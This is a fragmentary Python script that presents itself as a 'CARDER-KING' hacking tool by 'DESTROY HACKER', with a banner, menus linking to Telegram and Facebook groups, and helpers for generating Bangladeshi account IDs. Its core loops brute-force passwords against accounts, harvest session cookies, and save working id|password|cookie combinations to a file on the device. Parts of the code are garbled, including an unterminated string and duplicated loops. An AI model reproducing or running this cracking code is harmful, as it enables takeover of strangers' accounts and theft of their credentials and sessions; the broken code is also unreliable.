...
def banner():
    #os.system('clear')
 print(f"""   \033[32;1m  ____    _    ____  ____  _____ ____  
\033[33;1m  / ___|  / \  |  _ \|  _ \| ____|  _ \ 
\033[31;1m | |     / _ \ | |_) | | | |  _| | |_) |
\033[34;1m | |___ / ___ \|  _ <| |_| | |___|  _ < 
  \033[32;1m\____/_/   \_|_| \_|____/|_____|_| \_\                                              
  \033[91;1m  ╔════════════════════════════════════════╗
   {H} ║{P}[{H}•{P}] Author     :{warna} DESTROY                 {N}{H}║
  {H}  ║{P}[{H}•{P}] Telegram C : {H}DARK CARDER            {N}{H}║
    {H}║{P}[{H}•{P}] Telegram : {M} DESTROY HACKER        {N}{H}║
  {H}  ║{P}[{H}•{P}] Github    : {K}github.com/DESTROY-HACKER{N}    {H}║
  {H}  ║{P}[{H}•{P}] Status    : {H}PREMIUM {P}     {N}      {H}     ║
   {H} ║{P}[{H}•{P}] Network   : {H}3G{N}, {H}4G/5G/6G/100G{N}, {H}ON{N}     {H}      ║
...
def mainx():
    ...
    print(f'{K} [{H}8{K}] {N}Contract DESTROY HACKER')
    ...
    if mahin in ["1","01"]:
     ...
     os.system("xdg-open https://github.com/DESTROY-HACKER");mainx()
    elif mahin in ["8","08"]:
     os.system("xdg-open https://t.me/DESTROYHACKER");mainx()
    elif mahin in ["0","00"]:
     print(f'{gen}{RED}Exited {H}CARDER KING {P}Terminal ');os.system("xdg-open https://t.me/DESTROYHACKER");time.sleep(3);os.system('xdg-open https://www.facebook.com/groups/fb.king.cyber/?ref=share');exit()
    else:
     print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://t.me/DESTROYHACKER");mainx()
def mainx2():
    os.system("clear")
    banner()
...
def sep():
    ...
    print(led);print(f'{dot}Total File Ids {M}:{H} ' +
          str(len(open(file_name).read().splitlines())));print(led);print(f'{gen}Example {M}:{H} /sdcard/Carder.txt');print(led)
...
def dupcutter():
    os.system('clear');banner();print(f'{dot}Example   {RED}:{H} /sdcard/carder.txt');print(led)
    Error = input(f"{wt}{N}File Name {RED}:{H} ");print(led);print(f'{dot}Example   {RED}:{H} /sdcard/Carder.txt');print(led)
...
# BANGLADESH 7 DIGIT -- CARDER-KING #
def x7():
  user=[]
...
def m1(idf,pwv):
    ...
    for pw in pwv: 
        try:
            ...
            pw = pw.lower()
            get = session.get(f"https://t.me/DESTROYHACKER)
            date = {
 ...
 for pw in pwv:
  try:
   ...
   if "checkpoint" in po.cookies.get_dict().keys():
    ...
    ok+=1
    print(f'\r{P} [{H}CARDER-KING-OK{P}] {GREEN}{idf}|{pw}{xxx}')
    if 'y' in cokix:
     print(f'\r{gen}{H}'+kuki)
    open(' /sdcard/CARDER-KING-OK.txt','a').write(idf+'|'+pw+'\n')
    break
   else:
    continue
  except requests.exceptions.ConnectionError:
  ...
  for pw in pwv:
    try:
      ...
      if "checkpoint" in po.cookies.get_dict().keys():
        ...
        kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
        idf = re.findall('c_user=(.*);xs', kuki)[0]
        print(f'\r{P} [CARDER-KING{P}] {GREEN}{idf}|{pw}{xxx}')
        if 'y' in cokix:
         print(f'\r{gen}{H}'+kuki)
        open(' /sdcard/CARDER-KING-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
        break
